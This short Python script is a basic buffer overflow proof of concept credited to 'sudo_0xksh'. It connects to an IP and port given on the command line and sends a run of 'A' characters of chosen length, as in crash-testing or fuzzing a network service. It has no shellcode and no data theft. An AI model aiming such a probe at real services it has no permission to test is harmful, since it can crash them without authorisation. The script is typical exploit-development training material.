import socket
import sys

print("=========================================")
print("Basic Buffer Overflow PoC")
print("=========================================")

if len(sys.argv) != 4:
    print("Usage: python bof_poc.py <ip> <port> <payload_size>")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
payload_size = int(sys.argv[3])

payload = "A" * payload_size

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(payload.encode())
s.close()

print(f"Sent payload of size: {payload_size}")

print("\n=========================================")
print("Developed by sudo_0xksh")
print("=========================================")
